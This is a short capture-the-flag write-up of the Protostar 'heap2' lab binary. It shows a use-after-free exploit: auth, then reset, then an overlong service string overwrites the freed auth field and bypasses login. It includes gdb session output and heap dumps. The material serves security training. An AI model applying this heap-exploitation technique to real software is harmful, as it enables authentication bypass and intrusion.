**Heap2**



After playing around with the commands in gdb, I saw reset doesn't zero out the pointer to auth. That made me realize we can call auth, then reset to free the memory and call service to write over the auth integer.


**Solving the Challenge**

Setting a breakpoint to view the heap.

```diff
$ gdb heap2
$ disas main
$ b *0x0804899e
```


The exploit.

```diff
(gdb) r
Starting program: /opt/protostar/bin/heap2 
[ auth = (nil), service = (nil) ]
auth TEMP

Breakpoint 1, 0x0804899e in main (argc=1, argv=0xbffffee4) at heap2/heap2.c:24
24	heap2/heap2.c: No such file or directory.
	in heap2/heap2.c
(gdb) c
Continuing.
[ auth = 0x804c008, service = (nil) ]
csdcds

Breakpoint 1, 0x0804899e in main (argc=1, argv=0xbffffee4) at heap2/heap2.c:24
24	in heap2/heap2.c
(gdb) c
Continuing.
[ auth = 0x804c008, service = (nil) ]
reset

Breakpoint 1, 0x0804899e in main (argc=1, argv=0xbffffee4) at heap2/heap2.c:24
24	in heap2/heap2.c
(gdb) c
Continuing.
[ auth = 0x804c008, service = (nil) ]
service AAAABBBBCCCCDDDDEEEEFFFF

Breakpoint 1, 0x0804899e in main (argc=1, argv=0xbffffee4) at heap2/heap2.c:24
24	in heap2/heap2.c

(gdb) c
Continuing.
[ auth = 0x804c008, service = 0x804c028 ]
login

Breakpoint 1, 0x0804899e in main (argc=1, argv=0xbffffee4) at heap2/heap2.c:24
24	in heap2/heap2.c
(gdb) c
Continuing.
you have logged in already!
[ auth = 0x804c008, service = 0x804c028 ]

```


**Heap**

After the auth:

```diff
(gdb) x/30x 0x804c008
0x804c008:	0x504d4554	0x0000000a	0x00000000	0x00000ff1
0x804c018:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c028:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c078:	0x00000000	0x00000000
```

After the service:

```diff
(gdb) x/30x 0x804c008
0x804c008:	0x00000000	0x0000000a	0x00000000	0x00000021
0x804c018:	0x41414120	0x42424241	0x43434342	0x44444443
0x804c028:	0x45454544	0x46464645	0x00000a46	0x00000fd1
0x804c038:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c048:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c058:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c068:	0x00000000	0x00000000	0x00000000	0x00000000
0x804c078:	0x00000000	0x00000000
```